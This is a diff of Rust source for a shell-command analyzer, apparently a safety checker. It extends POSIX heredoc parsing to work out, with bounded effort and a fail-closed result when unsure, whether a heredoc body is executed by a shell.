+                    word_start = true;
                 }
+                dollar_run = if byte == b'$' { dollar_run + 1 } else { 0 };
                 index += 1;
                 continue;
             }
@@ -4005,12 +4761,28 @@ fn posix_heredoc_specs(
             index += 1;
             continue;
         }
-        if bytes.get(index..index + 3) == Some(b"$((") {
-            if let Some(close) = find_shell_delimiter_close(line, index + 1, ShellType::Posix) {
-                index = close + 1;
-                word_start = false;
-                continue;
+        // Arithmetic (`$((...))`, and `((...))` as a command, also after
+        // `for`) and `${...}` hold `<<` as a shift or as text. One left open
+        // at the line end stays inert on the next lines until it closes.
+        let inert_start = if bytes.get(index..index + 3) == Some(b"$((") {
+            Some((index + 1, InertText::Arithmetic, 2))
+        } else if word_start && bytes.get(index..index + 2) == Some(b"((") {
+            Some((index, InertText::Arithmetic, 2))
+        } else if bytes.get(index..index + 2) == Some(b"${") {
+            Some((index + 1, InertText::Parameter, 1))
+        } else {
+            None
+        };
+        if let Some((open, kind, depth)) = inert_start {
+            word_start = false;
+            match find_shell_delimiter_close(line, open, ShellType::Posix) {
+                Some(close) => index = close + 1,
+                None => {
+                    inert = Some((kind, depth));
+                    index = open + depth;
+                }
             }
+            continue;
         }
         if bytes.get(index..index + 3) == Some(b"<<<") {
             // Here-strings have a different expansion grammar and no delimiter
@@ -4020,6 +4792,23 @@ fn posix_heredoc_specs(
             index += 3;
             word_start = false;
             continue;
+        }
+        if matches!(byte, b'(' | b')') {
+            if let Some(open) = double_quoted_bodies.last_mut() {
+                if byte == b'(' {
+                    *open += 1;
+                } else {
+                    *open -= 1;
+                }
+                if *open == 0 {
+                    double_quoted_bodies.pop();
+                    quote = ShellLexQuote::Double;
+                    dollar_run = 0;
+                }
+                word_start = byte == b'(';
+                index += 1;
+                continue;
+            }
         }
         if bytes.get(index..index + 2) != Some(b"<<") {
             word_start = matches!(byte, b' ' | b'\t' | b';' | b'&' | b'|');
@@ -4031,9 +4820,20 @@ fn posix_heredoc_specs(
         match parse_posix_heredoc_delimiter(line, operator) {
             Ok((delimiter, quoted, end)) => {
                 let strip_tabs = bytes.get(operator + 2) == Some(&b'-');
+                // Digits are the descriptor only when they are the whole word
+                // (`3<<EOF`); `sh2<<EOF` runs `sh2` with a heredoc on stdin.
                 let digit_start = line[..operator]
                     .rfind(|character: char| !character.is_ascii_digit())
                     .map_or(0, |offset| offset + 1);
+                let digit_start = if digit_start == 0
+                    || matches!(
+                        bytes[digit_start - 1],
+                        b' ' | b'\t' | b'\n' | b';' | b'&' | b'|' | b'(' | b')'
+                    ) {
+                    digit_start
+                } else {
+                    operator
+                };
                 let fd = line
                     .get(digit_start..operator)
                     .filter(|raw| !raw.is_empty());
@@ -4041,8 +4841,11 @@ fn posix_heredoc_specs(
                     delimiter,
                     quoted,
                     strip_tabs,
+                    word_ends_in_cr: bytes.get(end) == Some(&b'\r') && end + 1 == bytes.len(),
                     operator_range: digit_start..end,
-                    stdin: fd.is_none_or(|raw| raw == "0"),
+                    fd: fd
+                        .and_then(descriptor_number)
+                        .unwrap_or_else(|| "0".to_string()),
                 });
                 index = end;
                 word_start = false;
@@ -4056,9 +4859,18 @@ fn posix_heredoc_specs(
     // A quote can legitimately span physical lines. The caller carries this
     // state so `<<EOF` text on a later quoted line cannot be invented as a
     // heredoc operator. If a real heredoc header itself leaves a quote open,
-    // its body boundary is ambiguous and must remain fail-closed.
-    let quote_ambiguous_for_heredoc = !specs.is_empty() && quote != ShellLexQuote::Normal;
-    (specs, unsupported || quote_ambiguous_for_heredoc, quote)
+    // its body boundary is ambiguous and must remain fail-closed (the caller
+    // checks this once the header's continued lines are joined).
+    (
+        specs,
+        unsupported,
+        PosixHeaderLex {
+            quote,
+            double_quoted_bodies,
+            inert,
+            continued: continues,
+        },
+    )
 }
 
 fn mask_non_newline(bytes: &mut [u8], range: std::ops::Range<usize>) {
@@ -4152,74 +4964,1200 @@ fn scan_unquoted_heredoc_expansions(body: &str, scan: &mut PosixHeredocRecovery)
     }
 }
 
-fn shell_reads_heredoc_from_stdin(command: &str, args: &[String]) -> Option<ShellType> {
-    let child_shell = match command {
-        "sh" | "bash" | "zsh" | "dash" | "ksh" | "csh" | "tcsh" | "ash" | "mksh" => {
-            ShellType::Posix
-        }
-        "fish" => ShellType::Fish,
-        _ => return None,
-    };
-    let mut force_stdin = false;
-    let mut index = 0usize;
-    while index < args.len() {
-        let option = static_wrapper_word(&args[index], ShellType::Posix)?;
-        if option == "--" {
-            return (force_stdin || index + 1 == args.len()).then_some(child_shell);
-        }
-        if !option.starts_with('-') || option == "-" {
-            return force_stdin.then_some(child_shell);
-        }
-        if option == "-c"
-            || option == "--command"
-            || (option.starts_with('-') && !option.starts_with("--") && option[1..].contains('c'))
-        {
-            return None;
-        }
-        if option == "-s"
-            || (option.starts_with('-') && !option.starts_with("--") && option[1..].contains('s'))
-        {
-            force_stdin = true;
-        }
-        let takes_value = matches!(
-            option.as_str(),
-            "-o" | "-O" | "--rcfile" | "--init-file" | "--startup-file"
-        ) || (child_shell == ShellType::Fish
-            && matches!(
-                option.as_str(),
-                "-C" | "--init-command" | "--features" | "--profile-startup"
-            ));
-        index += if takes_value { 2 } else { 1 };
-    }
-    Some(child_shell)
+/// Who reads a heredoc's body: a shell that runs it as code, and whether a
+/// reader may run it later or cannot be told (fail closed).
+#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
+struct HeredocReading {
+    /// The shell that runs the body as code.
+    shell: Option<ShellType>,
+    /// A shell, `.`/`source` or a bare `exec` holds the body on a descriptor
+    /// other than its script input, where a later read may run it, or the
+    /// reader could not be found within the bounds.
+    ambiguous: bool,
 }
 
-fn heredoc_interpreter_for_header(
+impl HeredocReading {
+    /// Data for a command that does not run it.
+    const DATA: Self = Self {
+        shell: None,
+        ambiguous: false,
+    };
+    const AMBIGUOUS: Self = Self {
+        shell: None,
+        ambiguous: true,
+    };
+
+    fn shell(shell: ShellType) -> Self {
+        Self {
+            shell: Some(shell),
+            ambiguous: false,
+        }
+    }
+
+    /// The reading of a body that both `self` and `other` may read.
+    fn or(self, other: Self) -> Self {
+        Self {
+            shell: self.shell.or(other.shell),
+            ambiguous: self.ambiguous || other.ambiguous,
+        }
+    }
+}
+
+/// Most nested reserved words, groups and compound commands read through to
+/// find a heredoc's readers; deeper nesting is ambiguous.
+const MAX_HEREDOC_READER_DEPTH: usize = 16;
+/// Most shell text (bytes) the readers of all heredocs of one input may
+/// tokenize; past it a reading is ambiguous.
+const MAX_HEREDOC_READER_WORK_BYTES: usize = 128 * 1024;
+
+/// The descriptor a heredoc opens and the work left for finding its readers.
+struct HeredocReadContext<'a> {
+    fd: &'a str,
+    /// Bytes of shell text that may still be tokenized.
+    work: &'a mut usize,
+}
+
+impl HeredocReadContext<'_> {
+    /// The segments of `text`, or `None` once the work bound is spent.
+    fn tokenize(&mut self, text: &str) -> Option<Vec<tokenize::Segment>> {
+        let Some(left) = self.work.checked_sub(text.len()) else {
+            *self.work = 0;
+            return None;
+        };
+        *self.work = left;
+        Some(tokenize::tokenize(text, ShellType::Posix))
+    }
+}
+
+/// Who reads the heredoc whose operator spans `operator..operator_end` and
+/// opens descriptor `cx.fd` in the (operator-masked) text `text`. `None`
+/// when the heredoc follows a closing word (`fi`, `done`, `esac`, `}`)
+/// whose compound command does not start in `text`.
+///
+/// A shell (or `.`/`source`) runs the body when it reads its script from
+/// stdin and stdin is the heredoc: a heredoc on stdin, or one on descriptor
+/// `fd` that a later `<&fd` / `0<&fd` of the same command copies to stdin
+/// (redirections apply left to right, so `sh 0<&3 3<<EOF` does not). Its
+/// script comes from stdin with no operand, after `-`, `--` or `-s`, and with
+/// a `/dev/stdin`, `/dev/fd/0` or `/proc/self/fd/0` operand. A `/dev/fd/<fd>`
+/// operand reads the heredoc directly. Redirection words are not operands.
+/// Any other heredoc on another descriptor of a shell, `.`/`source` or a bare
+/// `exec` (which keeps it open in the current shell) is ambiguous.
+///
+/// Reserved words before the command (`!`, `if`, `then`, `elif`, `else`,
+/// `while`, `until`, `do`, `coproc`, a `{` or `(` group, a case arm's
+/// `pattern)`) leave its reader unchanged: `if true; then sh <<'EOF'; fi`
+/// is read by `sh`. A heredoc on a compound command (`{ ...; } <<EOF`,
+/// `( ... ) <<EOF`, `if ...; fi <<EOF`, `while ...; done <<EOF`,
+/// `case ... esac <<EOF`) is the standard input of every command in it, so
+/// the body is code when any of them runs it.
+fn heredoc_reader(
+    text: &str,
+    operator: usize,
+    operator_end: usize,
+    depth: usize,
+    cx: &mut HeredocReadContext,
+) -> Option<HeredocReading> {
+    let Some(segments) = cx.tokenize(text) else {
+        return Some(HeredocReading::AMBIGUOUS);
+    };
+    heredoc_reader_at(text, &segments, None, operator, operator_end, depth, cx)
+}
+
+/// [`heredoc_reader`] with the `segments` of `text` already read, and with
+/// their [`posix_compound_words`] when the caller has them.
+fn heredoc_reader_at(
+    text: &str,
+    segments: &[tokenize::Segment],
+    compound_words: Option<&[PosixCompoundWords]>,
+    operator: usize,
+    operator_end: usize,
+    depth: usize,
+    cx: &mut HeredocReadContext,
+) -> Option<HeredocReading> {
+    let Some(depth) = depth.checked_sub(1) else {
+        return Some(HeredocReading::AMBIGUOUS);
+    };
+    let Some(index) = heredoc_operator_segment(text, segments, operator) else {
+        return Some(HeredocReading::DATA);
+    };
+    let segment = &segments[index];
+    let range = segment.byte_range.clone();
+    let after_operator = text
+        .get(operator_end.min(range.end)..range.end)
+        .unwrap_or_default();
+    let lead = posix_command_lead(text, range.clone(), operator);
+    let reading = match lead.end {
+        PosixLeadEnd::Group(open) => {
+            heredoc_group_reader(text, open, range.end, operator, operator_end, depth, cx)
+        }
+        PosixLeadEnd::Closer(closer, closer_start) => {
+            let copied = descriptor_copied_to_stdin(after_operator, cx.fd);
+            return heredoc_compound_reader(
+                text,
+                &segments[..index],
+                compound_words,
+                (closer, closer_start),
+                copied,
+                depth,
+                cx,
+            );
+        }
+        PosixLeadEnd::Nothing => HeredocReading::DATA,
+        // The command after its reserved words, read on its own.
+        PosixLeadEnd::Command(_) => match lead.words.last() {
+            Some(last) => heredoc_reader(
+                text.get(last.end..range.end).unwrap_or_default(),
+                operator.saturating_sub(last.end),
+                operator_end.saturating_sub(last.end),
+                depth,
+                cx,
+            )
+            .unwrap_or(HeredocReading::AMBIGUOUS),
+            None => {
+                let copied = descriptor_copied_to_stdin(after_operator, cx.fd);
+                let reading = heredoc_command_reader(segment, cx.fd, cx.fd == "0" || copied);
+                // zsh also reads reserved words after a leading redirection
+                // (`<<'EOF' { sh; }`, `<<'EOF' if true; then sh; fi`): the
+                // heredoc is the standard input of that compound command,
+                // read as the rest of the text.
+                let after = posix_command_lead(text, range.clone(), usize::MAX);
+                let compound = range.start >= operator
+                    && (!after.words.is_empty() || matches!(after.end, PosixLeadEnd::Group(_)));
+                if compound {
+                    let rest = text.get(operator_end.min(text.len())..).unwrap_or_default();
+                    reading.or(heredoc_list_reader(rest, copied, depth, cx))
+                } else {
+                    reading
+                }
+            }
+        },
+    };
+    Some(reading)
+}
+
+/// The reader of a heredoc whose operator is in, or after, the group that
+/// the `{` or `(` at `text[open]` opens in a segment ending at `end`.
+fn heredoc_group_reader(
+    text: &str,
+    open: usize,
+    end: usize,
+    operator: usize,
+    operator_end: usize,
+    depth: usize,
+    cx: &mut HeredocReadContext,
+) -> HeredocReading {
+    let Some((body, close)) = posix_group_body(text, open, end, cx) else {
+        return HeredocReading::AMBIGUOUS;
+    };
+    match close {
+        Some(close) if operator > close => {
+            let after_group = text.get(close + 1..end.max(close + 1)).unwrap_or_default();
+            let before_operator = text.get(close + 1..operator).unwrap_or_default();
+            // A command word after `(...)` makes it a case arm's `(pattern)`.
+            if text.as_bytes()[open] == b'('
+                && !crate::escalation::args_without_redirections(&tokenize::split_words(
+                    before_operator,
+                ))
+                .is_empty()
+            {
+                return heredoc_reader(
+                    after_group,
+                    operator - (close + 1),
+                    operator_end.saturating_sub(close + 1),
+                    depth,
+                    cx,
+                )
+                .unwrap_or(HeredocReading::AMBIGUOUS);
+            }
+            let after_operator = text.get(operator_end.min(end)..end).unwrap_or_default();
+            let copied = descriptor_copied_to_stdin(after_operator, cx.fd);
+            heredoc_list_reader(&text[body], copied, depth, cx)
+        }
+        _ => heredoc_reader(
+            &text[body.clone()],
+            operator.saturating_sub(body.start),
+            operator_end.saturating_sub(body.start),
+            depth,
+            cx,
+        )
+        .unwrap_or(HeredocReading::AMBIGUOUS),
+    }
+}
+
+/// The reader of a heredoc on the compound command that `closer` (at
+/// `closer_start`) ends, found among the `previous` segments of `text`:
+/// every command between the opening word and the closer reads it.
+/// `None` when no opening word is found.
+fn heredoc_compound_reader(
+    text: &str,
+    previous: &[tokenize::Segment],
+    compound_words: Option<&[PosixCompoundWords]>,
+    (closer, closer_start): (&str, usize),
+    copied: bool,
+    depth: usize,
+    cx: &mut HeredocReadContext,
+) -> Option<HeredocReading> {
+    let openers: &[&str] = match closer {
+        "fi" => &["if"],
+        "done" => &["while", "until", "for", "select"],
+        "esac" => &["case"],
+        _ => &["{"],
+    };
+    let mut nested = 0usize;
+    for (index, segment) in previous.iter().enumerate().rev() {
+        let computed;
+        let words = match compound_words.and_then(|known| known.get(index)) {
+            Some(known) => known,
+            None => {
+                computed = posix_compound_words(text, segment.byte_range.clone());
+                &computed
+            }
+        };
+        for (position, &(word, word_end)) in words.iter().enumerate().rev() {
+            if word == closer {
+                nested += 1;
+                continue;
+            }
+            if !openers.contains(&word) {
+                continue;
+            }
+            if nested > 0 {
+                nested -= 1;
+                continue;
+            }
+            // The commands start after the opening word, after a `for` or
+            // `select` header and after the first pattern of a `case`.
+            let body_start = match word {
+                "for" | "select" => segment.byte_range.end,
+                "case" => match words.get(position + 1) {
+                    Some(&(")", pattern_end)) => pattern_end,
+                    _ => segment.byte_range.end,
+                },
+                _ => word_end,
+            };
+            let body = text.get(body_start..closer_start).unwrap_or_default();
+            return Some(heredoc_list_reader(body, copied, depth, cx));
+        }
+    }
+    None
+}
+
+/// How the commands of the list `text` read a heredoc that is their
+/// standard input (`cx.fd` 0) or that is on descriptor `cx.fd` (copied to
+/// stdin for all of them when `copied`).
+fn heredoc_list_reader(
+    text: &str,
+    copied: bool,
+    depth: usize,
+    cx: &mut HeredocReadContext,
+) -> HeredocReading {
+    let Some(depth) = depth.checked_sub(1) else {
+        return HeredocReading::AMBIGUOUS;
+    };
+    let Some(segments) = cx.tokenize(text) else {
+        return HeredocReading::AMBIGUOUS;
+    };
+    let mut reading = HeredocReading::DATA;
+    for segment in &segments {
+        let range = segment.byte_range.clone();
+        let lead = posix_command_lead(text, range.clone(), usize::MAX);
+        let next = match lead.end {
+            PosixLeadEnd::Group(open) => match posix_group_body(text, open, range.end, cx) {
+                Some((body, close)) => {
+                    let rest = close.map_or(range.end, |close| close + 1);
+                    heredoc_list_reader(&text[body], copied, depth, cx).or(heredoc_list_reader(
+                        text.get(rest..range.end).unwrap_or_default(),
+                        copied,
+                        depth,
+                        cx,
+                    ))
+                }
+                None => HeredocReading::AMBIGUOUS,
+            },
+            PosixLeadEnd::Command(_) => match lead.words.last() {
+                Some(last) => heredoc_list_reader(
+                    text.get(last.end..range.end).unwrap_or_default(),
+                    copied,
+                    depth,
+                    cx,
+                ),
+                None => {
+                    let on_stdin =
+                        cx.fd == "0" || copied || descriptor_copied_to_stdin(&segment.raw, cx.fd);
+                    heredoc_command_reader(segment, cx.fd, on_stdin)
+                }
+            },
+            PosixLeadEnd::Closer(..) | PosixLeadEnd::Nothing => HeredocReading::DATA,
+        };
+        reading = reading.or(next);
+    }
+    reading
+}
+
+/// Who reads the heredoc of the simple command `segment` (reserved words
+/// already read): `on_stdin` when the heredoc is its standard input.
+fn heredoc_command_reader(segment: &tokenize::Segment, fd: &str, on_stdin: bool) -> HeredocReading {
+    let bare_exec = segment.command.as_deref().is_some_and(|command| {
+        crate::rules::command::normalize_cmd_base(command, ShellType::Posix) == "exec"
+    }) && crate::escalation::args_without_redirections(&segment.args)
+        .iter()
+        .all(|word| word.starts_with('-'));
+    if bare_exec {
+        return HeredocReading::AMBIGUOUS;
+    }
+    let Some((command, args)) = resolve_wrapped_command_for_shell(segment, ShellType::Posix) else {
+        return HeredocReading::DATA;
+    };
+    let command = crate::rules::command::normalize_cmd_base(&command, ShellType::Posix);
+    let child_shell = match command.as_str() {
+        "sh" | "bash" | "zsh" | "dash" | "ksh" | "csh" | "tcsh" | "ash" | "mksh" | "."
+        | "source" => ShellType::Posix,
+        "fish" => ShellType::Fish,
+        _ => return HeredocReading::DATA,
+    };
+    let argv = crate::escalation::args_without_redirections(&args);
+    let mut remaining_bodies = MAX_POSIX_DISPATCH_JOIN_BODIES;
+    if on_stdin && posix_command_accepts_pipeline_as_code(&command, &argv, 0, &mut remaining_bodies)
+    {
+        return HeredocReading::shell(child_shell);
+    }
+    if fd == "0" {
+        return HeredocReading::DATA;
+    }
+    let names_heredoc = argv.iter().any(|word| {
+        static_wrapper_word(word, ShellType::Posix).is_some_and(|path| {
+            let parts = path
+                .split('/')
+                .filter(|part| !part.is_empty() && *part != ".")
+                .collect::<Vec<_>>();
+            match parts.as_slice() {
+                ["dev", "fd", number] | ["proc", "self", "fd", number] => {
+                    descriptor_number(number).as_deref() == Some(fd)
+                }
+                _ => false,
+            }
+        })
+    });
+    if names_heredoc {
+        HeredocReading::shell(child_shell)
+    } else {
+        HeredocReading::AMBIGUOUS
+    }
+}
+
+/// Whether a `<&fd` / `0<&fd` word in `text` copies descriptor `fd` to
+/// standard input.
+fn descriptor_copied_to_stdin(text: &str, fd: &str) -> bool {
+    tokenize::split_words(text).iter().any(|word| {
+        let target = word
+            .strip_prefix("0<&")
+            .or_else(|| word.strip_prefix("<&"))
+            .map(|target| target.strip_suffix('-').unwrap_or(target));
+        target.is_some_and(|target| descriptor_number(target).as_deref() == Some(fd))
+    })
+}
+
+/// The index of the segment of `line` that holds the heredoc operator
+/// (masked to blanks) at `operator`: the one between the control operators
+/// (`;`, `&&`, `||`, `|`, `&`, a newline) around it. The operator may stand
+/// before the command word (`true; <<'EOF' sh` is read by `sh`) or after its
+/// last word (`sh <<'EOF'; true` by `sh`). An operator with no command word
+/// of its own is read with the command after it: zsh runs $READNULLCMD for
+/// it, which copies the body into a pipe (`<<'EOF' | sh`).
+fn heredoc_operator_segment(
+    line: &str,
+    segments: &[tokenize::Segment],
+    operator: usize,
+) -> Option<usize> {
+    if segments.is_empty() {
+        return None;
+    }
+    // Only blanks and the control operator (or a newline) lie between two
+    // segments.
+    let separator_before = |index: usize| {
+        let gap = segments[index - 1].byte_range.end..segments[index].byte_range.start;
+        line.get(gap.clone())
+            .and_then(posix_separator_offset)
+            .map_or(segments[index].byte_range.start, |offset| {
+                gap.start + offset
+            })
+    };
+    // The separators increase with the segments: the holder is the last
+    // segment whose separator is not after the operator.
+    let (mut low, mut high) = (1usize, segments.len());
+    while low < high {
+        let middle = low + (high - low) / 2;
+        if separator_before(middle) <= operator {
+            low = middle + 1;
+        } else {
+            high = middle;
+        }
+    }
+    Some(low - 1)
+}
+
+/// The offset of the first control operator or newline in `gap`, text
+/// between two commands' words: any byte but a blank or a backslash-newline.
+fn posix_separator_offset(gap: &str) -> Option<usize> {
+    let bytes = gap.as_bytes();
+    let mut index = 0usize;
+    while index < bytes.len() {
+        match bytes[index] {
+            b' ' | b'\t' => index += 1,
+            b'\\' if bytes.get(index + 1) == Some(&b'\n') => index += 2,
+            _ => return Some(index),
+        }
+    }
+    None
+}
+
+/// How the reserved words that lead a POSIX command end.
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+enum PosixLeadEnd {
+    /// The command's first word starts at this byte.
+    Command(usize),
+    /// The `{` or `(` at this byte opens a group.
+    Group(usize),
+    /// The closing word (`fi`, `done`, `esac` or `}`) starting at this byte
+    /// ends a compound command.
+    Closer(&'static str, usize),
+    /// No command follows: a `for` / `select` header, a `case` header
+    /// before its first pattern, or nothing at all.
+    Nothing,
+}
+
+/// A reserved word, or the `)` that ends a case arm's pattern (a group's
+/// one-word last command and the `)` that closes the group, opened before
+/// the text, read the same), before a command, and the byte after it.
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+struct PosixLeadWord {
+    word: &'static str,
+    end: usize,
+}
+
+/// The reserved words that lead the command in `text[range]` and how they end.
+#[derive(Debug)]
+struct PosixLead {
+    words: Vec<PosixLeadWord>,
+    end: PosixLeadEnd,
+}
+
+/// Reserved words a command may follow in the same segment.
+const POSIX_LEAD_PREFIXES: &[&str] = &[
+    "!", "if", "then", "elif", "else", "while", "until", "do", "coproc",
+];
+/// Reserved words that end a compound command.
+const POSIX_LEAD_CLOSERS: &[&str] = &["fi", "done", "esac", "}"];
+
+/// Read the reserved words that lead the command in `text[range]`, as the
+/// shells read them at the start of a command. A word that starts at or
+/// after `limit` (the heredoc operator, masked to blanks) follows a
+/// redirection, so it is never reserved.
+fn posix_command_lead(text: &str, range: std::ops::Range<usize>, limit: usize) -> PosixLead {
+    let bytes = text.as_bytes();
+    let end = range.end.min(bytes.len());
+    let mut index = range.start;
+    let mut words = Vec::new();
+    // In a `case WORD in` header before its first pattern: the words left
+    // to skip (the subject, then `in`) before the patterns.
+    let mut case_header: Option<u8> = None;
+    let lead_end = loop {
+        while index < end {
+            match bytes[index] {
+                b' ' | b'\t' | b'\n' => index += 1,
+                b'\\' if bytes.get(index + 1) == Some(&b'\n') => index += 2,
+                _ => break,
+            }
+        }
+        if index >= end {
+            break PosixLeadEnd::Nothing;
+        }
+        if index >= limit {
+            break PosixLeadEnd::Command(index);
+        }
+        let scanned = posix_lead_word(bytes, index, end);
+        let word_end = scanned.end;
+        if word_end == index {
+            // An operator such as a redirection starts the command.
+            break PosixLeadEnd::Command(index);
+        }
+        let word = &text[index..word_end];
+        if let Some(skip) = case_header {
+            if skip > 0 {
+                case_header = Some(skip - 1);
+            } else if word.ends_with(')') {
+                words.push(PosixLeadWord {
+                    word: ")",
+                    end: word_end,
+                });
+                case_header = None;
+            }
+            index = word_end;
+            continue;
+        }
+        if bytes[index] == b'(' {
+            // `((` starts an arithmetic command.
+            break if bytes.get(index + 1) == Some(&b'(') {
+                PosixLeadEnd::Command(index)
+            } else {
+                PosixLeadEnd::Group(index)
+            };
+        }
+        let reserved = |expected: &str| posix_word_spells(word, expected);
+        if reserved("{") {
+            break PosixLeadEnd::Group(index);
+        }
+        if let Some(closer) = POSIX_LEAD_CLOSERS.iter().find(|closer| reserved(closer)) {
+            break PosixLeadEnd::Closer(closer, index);
+        }
+        let header = ["case", "for", "select"]
+            .into_iter()
+            .find(|header| reserved(header));
+        if let Some(word) = POSIX_LEAD_PREFIXES
+            .iter()
+            .copied()
+            .find(|prefix| reserved(prefix))
+            .or(header)
+        {
+            words.push(PosixLeadWord {
+                word,
+                end: word_end,
+            });
+            match word {
+                "for" | "select" => break PosixLeadEnd::Nothing,
+                "case" => case_header = Some(2),
+                _ => {}
+            }
+            index = word_end;
+            continue;
+        }
+        // A case arm's pattern: one word up to a `)` that closes nothing
+        // opened in it (`x)`, `$(echo x))`), or one word and a lone `)`
+        // (`x )`, and `y )` after a `|` or `;;` where the tokenizer starts a
+        // new segment). The lead goes on after the `)`. More words before a
+        // `)` are no pattern: they are the last command of a group opened
+        // before `text` (`sh - )`), read as a command, or a syntax error.
+        let pattern_end = if scanned.unopened_close {
+            Some(word_end)
+        } else {
+            let mut next = word_end;
+            while next < end && matches!(bytes[next], b' ' | b'\t') {
+                next += 1;
+            }
+            (next < end.min(limit) && bytes[next] == b')').then_some(next + 1)
+        };
+        if let Some(close_end) = pattern_end {
+            words.push(PosixLeadWord {
+                word: ")",
+                end: close_end,
+            });
+            index = close_end;
+            continue;
+        }
+        break PosixLeadEnd::Command(index);
+    };
+    PosixLead {
+        words,
+        end: lead_end,
+    }
+}
+
+/// Whether the shell word `word` is spelled `expected` once its
+/// backslash-newlines are removed (the shells join them before they read a
+/// reserved word); see [`is_strict_posix_reserved_word`].
+fn posix_word_spells(word: &str, expected: &str) -> bool {
+    let mut spelled = expected.bytes();
+    let bytes = word.as_bytes();
+    let mut index = 0usize;
+    while index < bytes.len() {
+        if bytes[index] == b'\\' && bytes.get(index + 1) == Some(&b'\n') {
+            index += 2;
+            continue;
+        }
+        if spelled.next() != Some(bytes[index]) {
+            return false;
+        }
+        index += 1;
+    }
+    spelled.next().is_none()
+}
+
+/// A shell word read by [`posix_lead_word`].
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+struct PosixLeadWordEnd {
+    /// The byte after the word.
+    end: usize,
+    /// The word ends with a `)` that closes nothing opened in it: in code an
+    /// unquoted `)` like that ends a case pattern (`x)`, `$(echo x))`) or a
+    /// group opened before the word.
+    unopened_close: bool,
+}
+
+/// Read the shell word starting at `bytes[index]` up to an unquoted blank,
+/// `;`, `&`, `|`, `<` or `>`, or through a `)` that closes nothing opened in
+/// the word, with its scopes read as the shells (and the tokenizer) read
+/// them: a `$(...)`, `$((...))`, `${...}`, backtick body or `(...)` in the
+/// word is part of it, blanks, quotes and operators included
+/// (`$(uname -s | tr A-Z a-z)` is one word). In double quotes only `$(` and
+/// a backtick open a body; in `${...}` a `(` or `)` is a plain byte; a
+/// backtick body ends at its first unescaped backtick, with every scope
+/// opened in it. A scope left open runs to `end`. Nesting has no bound (the
+/// tokenizer has none): the read is one pass over the word.
+fn posix_lead_word(bytes: &[u8], mut index: usize, end: usize) -> PosixLeadWordEnd {
+    #[derive(Clone, Copy, PartialEq, Eq)]
+    enum Scope {
+        Paren,
+        Parameter,
+        Backtick,
+    }
+    // Each open scope with whether double-quoted text resumes at its closer.
+    let mut scopes: Vec<(Scope, bool)> = Vec::new();
+    // Where the open backtick body sits in `scopes`: at most one is open, as
+    // a backtick in it closes it.
+    let mut backtick_open: Option<usize> = None;
+    let mut quote: Option<u8> = None;
+    // A `#` at the start of a word in a body starts a comment.
+    let mut word_start = false;
+    // The run of unescaped `$` before this byte.
+    let mut dollars = 0usize;
+    while index < end {
+        let byte = bytes[index];
+        let innermost = scopes.last().map(|&(scope, _)| scope);
+        let dollar_before = dollars;
+        dollars = if byte == b'$' { dollars + 1 } else { 0 };
+        if byte == b'`' {
+            if let Some(open) = backtick_open.take() {
+                let (_, in_double) = scopes[open];
+                scopes.truncate(open);
+                quote = in_double.then_some(b'"');
+                word_start = false;
+                index += 1;
+                continue;
+            }
+        }
+        match quote {
+            Some(b'\'') => {
+                if byte == b'\'' {
+                    quote = None;
+                } else if byte == b'\\'
+                    && backtick_open.is_some()
+                    && matches!(bytes.get(index + 1), Some(b'\\' | b'`'))
+                {
+                    index += 1;
+                }
+            }
+            Some(_) => match byte {
+                b'\\' => index += 1,
+                b'"' => quote = None,
+                b'`' => {
+                    backtick_open = Some(scopes.len());
+                    scopes.push((Scope::Backtick, true));
+                    quote = None;
+                    word_start = true;
+                    index += 1;
+                    continue;
+                }
+                // `$(` after an odd run of `$` (`$$(` is the PID and a `(`).
+                b'(' if dollar_before % 2 == 1 => {
+                    scopes.push((Scope::Paren, true));
+                    quote = None;
+                    word_start = true;
+                    index += 1;
+                    continue;
+                }
+                _ => {}
+            },
+            None => match byte {
+                b' ' | b'\t' | b'\n' | b';' | b'&' | b'|' | b'<' | b'>' if scopes.is_empty() => {
+                    break
+                }
+                b'\\' => index += 1,
+                b'\'' | b'"' => quote = Some(byte),
+                b'#' if word_start && innermost != Some(Scope::Parameter) => {
+                    // A comment in a body runs to the line end, or to the
+                    // backtick that ends the backtick body it is in.
+                    while index < end && bytes[index] != b'\n' {
+                        if backtick_open.is_some() {
+                            if bytes[index] == b'`' {
+                                break;
+                            }
+                            if bytes[index] == b'\\' && bytes.get(index + 1) != Some(&b'\n') {
+                                index += 1;
+                            }
+                        }
+                        index += 1;
+                    }
+                    continue;
+                }
+                b'`' => {
+                    backtick_open = Some(scopes.len());
+                    scopes.push((Scope::Backtick, false));
+                    word_start = true;
+                    index += 1;
+                    continue;
+                }
+                b'{' if dollar_before > 0
+                    && (innermost == Some(Scope::Parameter) || dollar_before % 2 == 1) =>
+                {
+                    scopes.push((Scope::Parameter, false));
+                }
+                b'(' if innermost != Some(Scope::Parameter)
+                    || matches!(
+                        index.checked_sub(1).map(|at| bytes[at]),
+                        Some(b'$' | b'<' | b'>')
+                    ) =>
+                {
+                    scopes.push((Scope::Paren, false));
+                    word_start = true;
+                    index += 1;
+                    continue;
+                }
+                b')' => match innermost {
+                    Some(Scope::Paren) => {
+                        let (_, in_double) = scopes.pop().unwrap_or((Scope::Paren, false));
+                        quote = in_double.then_some(b'"');
+                    }
+                    None => {
+                        return PosixLeadWordEnd {
+                            end: index + 1,
+                            unopened_close: true,
+                        }
+                    }
+                    // A plain byte in `${...}`; a backtick body cannot
+                    // close a paren opened before it.
+                    Some(_) => {}
+                },
+                b'}' if innermost == Some(Scope::Parameter) => {
+                    scopes.pop();
+                }
+                _ => {}
+            },
+        }
+        word_start = quote.is_none() && matches!(byte, b' ' | b'\t' | b'\n' | b';' | b'&' | b'|');
+        index += 1;
+    }
+    PosixLeadWordEnd {
+        end: index.min(end),
+        unopened_close: false,
+    }
+}
+
+/// The byte after the first `)` that closes nothing opened before it in the
+/// words of `bytes[index..stop]` (redirection operators between them
+/// skipped): the end of a case arm's pattern (`x )`) or of the last command
+/// of a group opened before the text (`sh - )`).
+fn posix_unopened_close_end(bytes: &[u8], mut index: usize, stop: usize) -> Option<usize> {
+    while index < stop {
+        match bytes[index] {
+            b' ' | b'\t' | b'\n' | b';' | b'&' | b'|' | b'<' | b'>' => index += 1,
+            _ => {
+                let word = posix_lead_word(bytes, index, stop);
+                if word.unopened_close {
+                    return Some(word.end);
+                }
+                index = word.end.max(index + 1);
+            }
+        }
+    }
+    None
+}
+
